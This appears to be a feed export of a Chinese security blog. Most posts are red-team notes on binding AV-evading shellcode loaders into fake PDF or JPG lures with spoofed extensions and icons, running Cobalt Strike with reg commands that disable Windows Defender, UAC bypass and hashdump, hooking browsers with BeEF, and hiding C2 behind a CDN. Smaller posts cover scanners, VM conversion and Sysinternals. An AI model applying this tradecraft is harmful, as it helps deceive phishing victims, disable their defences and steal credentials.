<li>作为一个安全从业人员，必须的有自己的扫描器工具，当然可以自己开发，也可以使用现有的成熟方案，之前用awvs比较多，vps上安装docker，现在awvs也都有docker版本的且为破解版的，pull一下很方便，当时也有不方便的地方，就是<br>扫描速度比较慢，可能很早之前感兴趣的目标放进去了，过一段时间都快忘记了，所以并不太具有“实效”性。而发现现在使用xray+brup的这种组合比较好，被动式扫描，会基于你点击的链接进行扫描，我们一般在测试某个网站的时候必定使用的工具就是<br>burpsuite，可以使用burpsuite的重放功能对目标进行手动测试，而且现在的burp(破解版)也有扫描的功能，也比较强大，然后联动xray，有时候就一直开着xray在那里一顿操作，xray都会把你点击的url进行扫描，相当于多了一个帮手帮你去检测。</li>
<li>关于xray如何联动burp网上有很多的教程，这里就不介绍了。<br><img src="/2022/04/17/web扫描/xray.png" alt=""><br><img src="/2022/04/17/web扫描/burpscan.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;作为一个安全从业人员，必须的有自己的扫描器工具，当然可以自己开发，也可以使用现有的成熟方案，之前用awv
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>捆绑钓鱼</title>
    <link href="http://kevien.github.io/2022/04/13/%E6%8D%86%E7%BB%91%E9%92%93%E9%B1%BC/"/>
    <id>http://kevien.github.io/2022/04/13/捆绑钓鱼/</id>
    <published>2022-04-13T09:05:35.000Z</published>
    <updated>2022-04-14T13:16:56.228Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>不是什么新技术，只是记录自己在探索实践过程中遇到的问题以及如何解决相应的问题，留存笔记以免忘记。<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2></li>
<li>捆绑的意思就是恶意程序以一个正常的程序（可以是程序也可以是文件如doc、pdf、jpg等）为载体，当这个“程序”执行的时候恶意程序即可运行。用于捆绑钓鱼的工具有很多，像是<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">BDF</a>应该是比较早的一款工具，但现在好像是不怎么免杀了，前段时间看过现在都在用<a href="https://github.com/evilashz/NimFileBinder" target="_blank" rel="noopener">NimFileBinder</a>这个工具进行捆绑，且免杀一些常见杀软，这个主要是利用了Nim这个小众语言做的（类似go，一些小众语言有时能做到很好的免杀）。我简单看了下作者的代码，整体还是比较简单的，对可执行文件的加密以及直接cmd /c 执行程序，作者也说了代码比较粗糙，其中还有两个注意点，比如要修改代码进行恶意程序自删除，还有绕过杀软的一个小技巧，这个在使用过程当中可以自己去适当修改。<h2 id="捆绑测试"><a href="#捆绑测试" class="headerlink" title="捆绑测试"></a>捆绑测试</h2></li>
<li>这里我们首先是利用工具<a href="https://github.com/crisprss/Shellcode_Memory_Loader" target="_blank" rel="noopener">Shellcode_Memory_Loader</a>生成一个免杀exe可执行文件（注意这个工具是使用go进行编译的），然后利用nimFileBinder工具捆绑pdf或者jpg文件等，首先是安装Nim，关于这个编译器的安装我之前是网上看的<a href="http://moy1sec.com/2021/12/20/mian-sha-diao-yu-kun-bang/" target="_blank" rel="noopener">文章</a>，然后在linux安装结果一大堆坑（主要是gfw的问题），就不过多说了，后面看到这篇文章才去发现还是在windows上安装更适合我，<a href="https://mp.weixin.qq.com/s?__biz=Mzg5OTY1ODMxMg==&amp;mid=2247488869&amp;idx=1&amp;sn=654cd56b2fd2cc65528297250a6a19c8&amp;chksm=c04eb242f7393b547421fedbd2889bf3fa238fadb7e62e942e8b9557545f4205e0bfc7883324&amp;token=839247748&amp;lang=zh_CN#rd" target="_blank" rel="noopener">XSS Flash弹窗钓鱼</a>,这篇文章里面就提到了在windows下安装nim以及一些nim库的问题，注意安装strfmt、nimcrypto的时候需要fq。<br>安装完成之后就可以对相应的exe文件进行绑定了，绑定完成这只是第一步。<h2 id="后缀伪装"><a href="#后缀伪装" class="headerlink" title="后缀伪装"></a>后缀伪装</h2></li>
<li>第一步绑定完成之后其实还是exe可执行文件，当然如果你要是直接绑定的exe文件这一步就可以跳过了（一般都是比较信任的人才会去点exe，而且有时候一些钓鱼场景里需要我们制作的是jpg或者pdf），就不需要伪装后缀了，毕竟受害者是要看pdf的，你发一个exe的后缀明显不太合适，关于后缀伪装有两种方式，一种是利用<a href="https://wolke.cn/post/5653cc29.html" target="_blank" rel="noopener">RLO的Unicode反转文件后缀钓鱼</a>，还有一种是在后面填充大量的空格。如图所示<br><img src="/2022/04/13/捆绑钓鱼/spacehide.png" alt=""></li>
<li>当然拉长文件名（名称）也是能够看到异常的，且文件类型列也是应用程序有问题的。<h2 id="图标伪装"><a href="#图标伪装" class="headerlink" title="图标伪装"></a>图标伪装</h2></li>
<li>第三步是图标伪装，后缀伪装完成之后还有默认的ico，很明显不是pdf或者jpg，那么是否有修改ico的方式，网上有一些修改ico的工具，比如resourcehacker工具，这个工具的原理应该是识别windows可执行文件的rsc区然后进行修改，但当我在测试的时候却发现我这里修改我之前使用Shellcode_Memory_Loader工具编译的exe并不能行，而其它的exe可以成功，猜测可能是因为go编译的原因，然后一番搜索之后发现原来go编译的时候可以进行图标的自定义，参考文章<a href="https://studygolang.com/articles/7980" target="_blank" rel="noopener">教你为Win下的Go程序添加图标</a>,当然在编译的时候注意直接 go build  -ldflags=”-H windowsgui” 就行 不要加xxx.go,否则生成失败。当然这里还是得有windows常见默认文件ico，网上搜了半天没搜到合适的就用png图片转ico做了个粗糙版的默认ico，如果你需要pdf.ico、jpg.ico可以找我分享给你～<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2></li>
<li><a href="https://security.tencent.com/index.php/blog/msg/165" target="_blank" rel="noopener">红蓝对抗之邮件钓鱼攻击</a></li>
<li><a href="https://www.cnblogs.com/yokan/p/15748583.html" target="_blank" rel="noopener">常见钓鱼手法 </a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;不是什么新技术，只是记录自己在探索实践过程中遇到的问题以及如何解决相应的问题，留存笔记以免忘记。&lt;h2 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>cs免杀上线及使用注意事项</title>
    <link href="http://kevien.github.io/2022/04/12/cs%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <id>http://kevien.github.io/2022/04/12/cs免杀上线及使用注意事项/</id>
    <published>2022-04-12T10:21:05.000Z</published>
    <updated>2022-04-20T07:45:39.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="cs免杀"><a href="#cs免杀" class="headerlink" title="cs免杀"></a>cs免杀</h2><ul>
<li>在上一篇cobaltstrike cdn上线隐藏c2 ip 之后，发现目标机器是win10，而win10一般都会开启windows defender（后面都简称wd）以及uac。</li>
<li>第一个问题就是如果绕过windows defender，网上有很多相关的免杀技术文章，有些已经过时有些还可以使用，我在测试了几个之后发现这篇文章介绍的技术目前还是可以bypass wd以及某数字杀软的，参考文章<a href="https://www.anquanke.com/post/id/262666" target="_blank" rel="noopener">CS shellcode内存加载器免杀及实现</a>。需要使用golang进行编译，注意编译时候添加选项  -ldflags=”-H windowsgui”，这样就没有黑框了。当然还可以进一步给程序加壳，加壳的话可以使用safengine。<br><img src="/2022/04/12/cs免杀上线及使用注意事项/safengine.png" alt=""></li>
<li><p>第二个问题就是我们接收到的beacon一般是管理员组的用户，但想要执行一些特殊操作，比如想要执行hashdump或者其他特权命令的时候,需要bypass uac.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关闭wd reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d 1 /t REG_DWORD /f，</span><br><span class="line">开启wd reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d 0 /t REG_DWORD /f）</span><br></pre></td></tr></table></figure>
</li>
<li><p>那么如何bypass uac 呢？同样网上有很多相关的文章，其中当属 hfiref0x的UACME较为流传广泛，且作者一直在更新这个工具（<a href="https://github.com/hfiref0x/UACME），~~自己没有去编译这个工具~~，而是使用了另外一款工具，https://github.com/0x9ef/golang-uacbypasser，也是glang写的，用了一下效果还可以，但不免杀，进行bypass" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME），~~自己没有去编译这个工具~~，而是使用了另外一款工具，https://github.com/0x9ef/golang-uacbypasser，也是glang写的，用了一下效果还可以，但不免杀，进行bypass</a> uac的时候会被wd干掉，所以还需做一下免杀（或者开启vnc desktop pid x86/64 low/high 远程桌面连接上去之后手动关闭wd）。cs上执行命令 shell main.exe  /o /path artifact.exe,之后上线的就是bypass的beacon，这个beacon就直接可以 hashdump以及一些特权操作了。<br><img src="/2022/04/12/cs免杀上线及使用注意事项/hashdump.png" alt=""></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2></li>
<li>1.大家在下载和使用cs的时候一定要去校验哈希，防止被黑吃黑，cs4.4下载地址<a href="https://github.com/k8gege/Aggressor/releases/tag/cs，以及到官方check哈希，https://verify.cobaltstrike.com/，然后配置https://github.com/Twi1ight/CSAgent" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor/releases/tag/cs，以及到官方check哈希，https://verify.cobaltstrike.com/，然后配置https://github.com/Twi1ight/CSAgent</a> 进行破解，这样用起来会比较放心。</li>
<li>2.在目标机器上执行命令的时候一定要非常小心，要执行的命令首先在测试机上测试一下，否则很容易被一些杀软动态查杀给干掉（然后你来之不易的beacon就掉线了）。比如这个脚本执行的时候<br><img src="/2022/04/12/cs免杀上线及使用注意事项/checkvm.png" alt=""><br><img src="/2022/04/12/cs免杀上线及使用注意事项/wd.png" alt=""><br><img src="/2022/04/12/cs免杀上线及使用注意事项/wd1.png" alt=""></li>
<li>3.teamserver经常掉线或者执行命令非常卡的时候可以考虑换个网络好点儿的vps，否则真的非常崩溃，且更换vps其实也很简单，之前的文章中cdn架构中也只需要修改cloudflare的dns一处即可。</li>
<li>4.cs的sleep心跳间隔默认是60s，可以设置成2s，0s不建议，因为一直保持连接可能会被发现并拦截。</li>
<li>5.进程迁移之后，建议unhook ntdll.dll 可以防止一些杀软的查杀。</li>
<li>6.cs还有一些特征会被wd进行查杀，建议在使用的时候还是进行进一步的免杀，参考文章<a href="https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9/" target="_blank" rel="noopener">对cobaltstrike4.4的简单魔改</a>，以及b站上视频<a href="https://space.bilibili.com/38824668/channel/collectiondetail?sid=309610" target="_blank" rel="noopener">从0开始学免杀</a></li>
<li>7.有时候我们拿到beacon之后如果不及时去迁移进程及权限维持很有可能会出现掉线（尤其是钓鱼的时候往往又不太方便第二次钓鱼），所以这个时候就需要我们收到beacon之后能及时知晓，这里有很多种方法，比如上线之后发送到微信或者钉钉，可以使用上线通知插件。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果想使用免费且支持微信模板消息推送的方式可以移步：https://github.com/lintstar/CS-PushPlus</span><br><span class="line"></span><br><span class="line">如果有订阅 ServerChan 的企业微信推送通道可以移步：https://github.com/lintstar/CS-ServerChan</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;cs免杀&quot;&gt;&lt;a href=&quot;#cs免杀&quot; class=&quot;headerlink&quot; title=&quot;cs免杀&quot;&gt;&lt;/a&gt;cs免杀&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;在上一篇cobaltstrike cdn上线隐藏c2 ip 之后，发现目标机器是win10，而win10一般都会
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>beef搭建踩坑及隐匿</title>
    <link href="http://kevien.github.io/2022/04/03/beef%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91%E5%8F%8A%E9%9A%90%E5%8C%BF/"/>
    <id>http://kevien.github.io/2022/04/03/beef搭建踩坑及隐匿/</id>
    <published>2022-04-03T12:27:23.000Z</published>
    <updated>2022-04-13T12:48:54.939Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2022/04/03/beef搭建踩坑及隐匿/flash.png" alt=""><br><img src="/2022/04/03/beef搭建踩坑及隐匿/windows-auth.png" alt=""></p>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>搭建基础工具cs之后，想着怎么搭建个钓鱼平台，看了像是flash钓鱼、windows凭据钓鱼、google页面钓鱼、印象笔记钓鱼，发现xss平台beef也都有这些工具，那为何不搭建个beef平台更方便呢，之前搭建过beef，但都也只是简单测试用，并没有真正去有效使用，实战使用起来就会发现一些问题。<h2 id="中间过程"><a href="#中间过程" class="headerlink" title="中间过程"></a>中间过程</h2></li>
<li>首先第一个问题，因为要attack的是一个https网站，如果插入的为<a href="http://ip/hook.js,浏览器的安全策略不允许这样干，所以beef要开启https功能，开启https功能很简单，按照github上的wiki，修改config.yaml文件中的beef.http.https.enable" target="_blank" rel="noopener">http://ip/hook.js,浏览器的安全策略不允许这样干，所以beef要开启https功能，开启https功能很简单，按照github上的wiki，修改config.yaml文件中的beef.http.https.enable</a> 为true即可,但因为beef为不信任证书，所以网站加载hook.js还是不行，解决办法就是给申请一张受信任证书，那自然就想到letsencrypt的免费https证书，然后还有域名的话可以去freenom上申请（域名申请可以参考cs那篇文章，可以选择适当的域名，比如 cdn.domain.com 啥的），其实在这里除了自己申请域名之外也可以使用ngrok（<a href="https://github.com/beefproject/beef/search?q=ngrok&amp;type=issues和https://github.com/beefproject/beef/wiki/Release-Notes" target="_blank" rel="noopener">参考</a>）。</li>
<li>第二个问题是证书出问题，自己在申请好证书之后，将beef_cert.pem和beef_key分别修改为fullchain.pem和privkey.pem，发现还是报错，查询了一会儿也没解决问题，一时陷入僵局。冷静思考了一会儿，想想自己之前搭建ctfd平台的时候，使用了nginx做了反向代理，当时的证书是没有这个问题的，那么尝试一下看行不行，结果是可行（参考<a href="https://shirmy.me/article/12）。" target="_blank" rel="noopener">https://shirmy.me/article/12）。</a></li>
<li>第三个问题，beef默认端口是3000，最开始自己尝试使用官方的github的docker进行构建，但是每次修改config.yaml都要重新构建镜像，而构建这个镜像又非常耗时，所以最后还是使用install脚本进行安装和调试，在调试过程中，发现直接访问beef后台以及hook.js 没有问题，但是并没有上线，打开浏览器网络发现请求的是域名的3000端口，这个时候修改beef.http.public.port为443即可。</li>
<li>本来以为处理这个问题应该很快，两三个小时就能搞定，结果断断续续花了两天时间才整完，当然在整个问题的解决过程当中自己也查看了beef的wiki，使自己对beef也有了更进一步的了解，只是http下的public和https让我一开始没怎么搞懂，费了半天劲。</li>
<li>附上nginx配置截图<br><img src="/2022/04/03/beef搭建踩坑及隐匿/nginx-conf.png" alt=""></li>
<li>然后看下beef的主要配置截图<br><img src="/2022/04/03/beef搭建踩坑及隐匿/beef-conf.png" alt=""></li>
<li>除此之后beef还可以和msf联动。可参考文章：<br><a href="https://blog.csdn.net/u014029795/article/details/116755248" target="_blank" rel="noopener">https://blog.csdn.net/u014029795/article/details/116755248</a><br><a href="https://github.com/beefproject/beef/issues/1322" target="_blank" rel="noopener">https://github.com/beefproject/beef/issues/1322</a><br><img src="/2022/04/03/beef搭建踩坑及隐匿/beef.png" alt=""></li>
<li>完成联动之后就可以使用msf针对浏览器的一些exploit攻击。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2022/04/03/beef搭建踩坑及隐匿/flash.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;/2022/04/03/beef搭建踩坑及隐匿/windows-auth.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>cobaltstrike cdn上线隐藏c2 ip</title>
    <link href="http://kevien.github.io/2022/03/29/cobaltstrike-cdn%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8Fc2-ip/"/>
    <id>http://kevien.github.io/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/</id>
    <published>2022-03-29T12:15:57.000Z</published>
    <updated>2022-04-13T12:56:09.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>使用公众号写了一些文章，不太方便持续更新和修改，所以把一些公众号文章搬运过来，在博客留存一下。<h2 id="笔记记录"><a href="#笔记记录" class="headerlink" title="笔记记录"></a>笔记记录</h2></li>
<li><p>最近测试了cobaltstrike cdn上线隐藏c2 ip，简短记录一下。</p>
</li>
<li><p>参考了文章  cobalt strike cdn上线笔记，文章没什么问题，但在实际测试过程当中遇到了一些坑点，特此记录一下。</p>
</li>
<li><p>首先自己按照文章搭建好之后发现上不了线</p>
<ol>
<li><p>首先排查一下是不是软件的问题，自己用的cs4.3，http的上线没有问题，故排除是cs工具问题</p>
</li>
<li><p>自己用的openjdk，当时怀疑是不是自己用来openjdk的问题，我看有些文章上说是oracle jdk可能会好点儿，但是oracle jdk下载比较费劲，得使用oracle账号登录，费了半天劲发现不是java问题</p>
</li>
<li><p>排查cdn问题，自己ping了一下自己的cdn解析，发现没有问题，而且使用浏览器访问script web delivery 网页的powershell也没有问题，故排除cdn dns配置问题。</p>
</li>
<li><p>后面再次对比文章，发现自己没有开启cloudflare的开发模式，开启之后发现可以上线，但是执行命令没有回显。</p>
</li>
<li><p>wireshark抓包分析没找到原因。</p>
</li>
<li><p>最后搜索文章发现如下两篇文章 <a href="https://bewhale.github.io/posts/50202.html" target="_blank" rel="noopener">CobaltStrike4.4汉化破解及特征去除</a>  <a href="https://myzxcg.com/2020/12/Cobalt-Strike%E5%8E%BB%E7%89%B9%E5%BE%81%E9%85%8D%E7%BD%AENginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86CDN%E4%B8%8ECloudflare-Worker/" target="_blank" rel="noopener">Cobalt-Strike去特征配置Nginx反向代理CDN与Cloudflare-Worker</a><br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/cloudflare-cdn.png" alt=""><br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/cloudflare-cdn1.png" alt=""></p>
</li>
</ol>
</li>
<li>没错，我用的就是这个jquery malleable-c2 profile，最终问题解决，成功上线。<br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/beacon.png" alt=""><br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/wireshark.png" alt=""><br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/ip.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;使用公众号写了一些文章，不太方便持续更新和修改，所以把一些公众号文章搬运过来，在博客留存一下。&lt;h2 i
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>虚拟化笔记</title>
    <link href="http://kevien.github.io/2021/06/01/%E8%99%9A%E6%8B%9F%E5%8C%96%E7%AC%94%E8%AE%B0/"/>
    <id>http://kevien.github.io/2021/06/01/虚拟化笔记/</id>
    <published>2021-06-01T09:35:06.000Z</published>
    <updated>2021-07-03T14:42:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><ul>
<li><p>此笔记用于记录qcow2后缀的文件如何转换成vmware格式 以及如何直接运行qcow2.</p>
<h3 id="qcow2转换成vmware格式"><a href="#qcow2转换成vmware格式" class="headerlink" title="qcow2转换成vmware格式"></a>qcow2转换成vmware格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img convert -f qcow2 myImage.qcow2 -O vmdk myNewImage.vmdk</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="https://stackoverflow.com/questions/37794846/convert-qcow2-to-vmdk-and-make-it-esxi-6-0-compatible" target="_blank" rel="noopener">qcow2转换成vmdk</a></p>
</li>
<li><a href="https://kb.vmware.com/s/article/2010196?lang=zh_CN" target="_blank" rel="noopener">如何使用vmware软件导入vmdk1</a></li>
<li><a href="https://jingyan.baidu.com/article/9113f81b2796852b3214c705.html" target="_blank" rel="noopener">如何使用vmware软件导入vmdk2</a></li>
<li><p><a href="https://stackoverflow.com/questions/66042320/migrating-kvm-guest-to-vmware-stuck-on-error-recovery-screen" target="_blank" rel="noopener">server2008转换后启动蓝屏如何解决</a></p>
<h3 id="qcow2转换成virtual-box格式"><a href="#qcow2转换成virtual-box格式" class="headerlink" title="qcow2转换成virtual box格式"></a>qcow2转换成virtual box格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#from https://gist.github.com/mamonu/671038b09f5ae9e034e8</span><br><span class="line">qemu-img convert -O vdi gnome.qcow2 gnome.vdi</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="https://blog.csdn.net/technologyleader/article/details/95094982" target="_blank" rel="noopener">VirtualBox虚拟机怎么导入已经存在的vdi文件</a></p>
<h3 id="mac上运行qcow2"><a href="#mac上运行qcow2" class="headerlink" title="mac上运行qcow2"></a>mac上运行qcow2</h3></li>
<li><p><a href="http://blog.leanote.com/post/7wlnk13/%E5%88%9B%E5%BB%BAKVM%E8%99%9A%E6%8B%9F%E6%9C%BA" target="_blank" rel="noopener">qemu-system-x86_64命令总结</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#常用命令</span><br><span class="line">qemu-system-x86_64 -m 4096 -smp 1 -drive file=xxx.qcow2</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="https://bytefreaks.net/gnulinux/send-altctrldelete-to-qemu-virtual-machine" target="_blank" rel="noopener">如何在虚拟机上发送control+alt+del键</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.ALT+CTRL+2进入命令行界面</span><br><span class="line">2.命令行输入sendkey alt-ctrl-delete</span><br><span class="line">3.ALT+CTRL+1切换回图形界面</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li><a href="https://sysin.org/blog/change-vmware-fusion-networking/" target="_blank" rel="noopener">如何修改 VMware Fusion 中的虚机网络 IP 地址段</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TL；DR&quot;&gt;&lt;a href=&quot;#TL；DR&quot; class=&quot;headerlink&quot; title=&quot;TL；DR&quot;&gt;&lt;/a&gt;TL；DR&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;此笔记用于记录qcow2后缀的文件如何转换成vmware格式 以及如何直接运行qcow2.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>学习参考</title>
    <link href="http://kevien.github.io/2021/05/28/%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%80%83/"/>
    <id>http://kevien.github.io/2021/05/28/学习参考/</id>
    <published>2021-05-28T03:21:21.000Z</published>
    <updated>2021-05-28T03:24:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>因为会不断有学员问如何学习xx领域的经验，所以搜集整理了一些网上的参考资源供学习者参考<h2 id="java代码审计"><a href="#java代码审计" class="headerlink" title="java代码审计"></a>java代码审计</h2></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&amp;mid=2247493775&amp;idx=1&amp;sn=570dc6150abc7fb7d2751d82d9c7c842&amp;chksm=fc3c518ecb4bd89878c057faca76677096c712a26c840e4b5f3ba1e3b2fe427b764ee7ebbaae&amp;mpshare=1&amp;scene=23&amp;srcid=0527A6VCmMnSMUEgi6mhK5ri&amp;sharer_sharetime=1622126601868&amp;sharer_shareid=f03c6e14fd46540b4a58dc4fc29ad18f%23rd" target="_blank" rel="noopener">学习Java代码审计时4个常见问题，几乎每个学员都会遇到</a></li>
<li><a href="https://www.cnblogs.com/afanti/p/13156152.html" target="_blank" rel="noopener">java代码审计之路</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;因为会不断有学员问如何学习xx领域的经验，所以搜集整理了一些网上的参考资源供学习者参考&lt;h2 id=&quot;j
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>蓝队必备技能之-systeminternal工具集使用</title>
    <link href="http://kevien.github.io/2020/11/05/%E8%93%9D%E9%98%9F%E5%BF%85%E5%A4%87%E6%8A%80%E8%83%BD%E4%B9%8B-systeminternal%E5%B7%A5%E5%85%B7%E9%9B%86%E4%BD%BF%E7%94%A8/"/>
    <id>http://kevien.github.io/2020/11/05/蓝队必备技能之-systeminternal工具集使用/</id>
    <published>2020-11-05T03:13:36.000Z</published>
    <updated>2022-04-10T11:01:15.296Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>在应急遇到windows系统的时候经常会使用systeminterna suite套件，这个套件是由<a href="https://twitter.com/markrussinovich" target="_blank" rel="noopener">Mark Russinovich</a>开发，systeminternals suite工具套件是免费的，大家可以从<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener">这里</a>下载的到。最早的这些工具都只是命令行的，后面被微软采购之后在很多工具上增加了图形化界面。</li>
<li>systeminternals 套件有非常多好用的工具，这些工具能够帮助我们很深入的去分析系统或者进行应急响应，同样当攻击者上传这些工具到系统上的时候，它同样能够提供给攻击者很多有价值的信息，例如psexec、ShellRunas都是攻击者的利器。</li>
<li>可以说无论是攻击方还是防守方都需要对systeminternals这个工具套件进行了解，本篇文章就依次对常见的工具做简单介绍以及对autoruns、procexp、procmon、tcpview工具使用注意事项进行介绍。<h2 id="常见工具介绍"><a href="#常见工具介绍" class="headerlink" title="常见工具介绍"></a>常见工具介绍</h2>当我们下载完成打开文件夹的时候会发现很多的工具，现在简单列举一些常用工具。</li>
<li>AccessChk　权限检查工具，可以检查文件、文件夹、注册表等权限</li>
<li>AccessEnum　文件系统全览以及注册表安全设置</li>
<li>AdExplorer 域环境活动目录查看和编辑器</li>
<li>AdInsight LDAP实时监控工具，用来域环境的一些应用</li>
<li>AdRestore 恢复删除的AD对象</li>
<li>Autologon 快速设置自动登录</li>
<li>Autoruns 显示所有登录启动项</li>
<li>BgInfo 显示计算机相关信息，例如计算机名称、IP地址信息等</li>
<li>DBgview 输出和显示debug信息</li>
<li>DiskMon 记录和显示所有磁盘活动信息</li>
<li>ListDLLs 显示进程所加载的dlls</li>
<li>LogonSessions 列举当前活动的登录sessions</li>
<li>Procexp 显示进程相关信息</li>
<li>Procmon 进程实时监控</li>
<li>PsExec 允许你在远程的系统上执行命令</li>
<li>PsPing  ping功能的补充</li>
<li>PsKill 结束本地或者远程操作系统上的进程</li>
<li>PsList 显示当前计算机上进程相关信息，包括进程名、进程号、内存信息等</li>
<li>PsLoggedOn 显示谁登录在本机或者远程机器上</li>
<li>PsLogList 允许本地或者远程对日志进行查询、保存以及删除等</li>
<li>PsPasswd 允许本地或者远程修改密码</li>
<li>ShellRunas 允许你使用不同的账号运行程序</li>
<li>Sysmon 监视和记录系统活动</li>
<li>TCPView  显示当前所有tcp和udp信息</li>
<li>ZoomIt 非常好用的放大镜</li>
<li>当然官方网站已经对这些工具做了很好的分类，分别为文件和磁盘工具集、网络工具集、进程工具集、安全相关工具集、系统信息工具集、其它工具。如下图所示：<br><img src="/2020/11/05/蓝队必备技能之-systeminternal工具集使用/catalog.png" alt=""><h2 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h2><img src="/2020/11/05/蓝队必备技能之-systeminternal工具集使用/autoruns.png" alt=""></li>
<li>在系统入侵之后，攻击者为了权限维持极有可能在系统上留后门，那么autoruns可以说是最强大的开机启动项检查工具了(没有之一)，其检查项包括计划任务、服务、驱动、注册表、WMI等。</li>
<li>注意右键以管理员方式运行autoruns工具，否则可能会有一些登录启动项查看不到，当你运行的时候那么这个工具就会扫描系统上的一些常见启动项。</li>
<li>除了查看功能，当选中某个条目时候还有删除、打开路径、上传virustotal检测、属性等功能。</li>
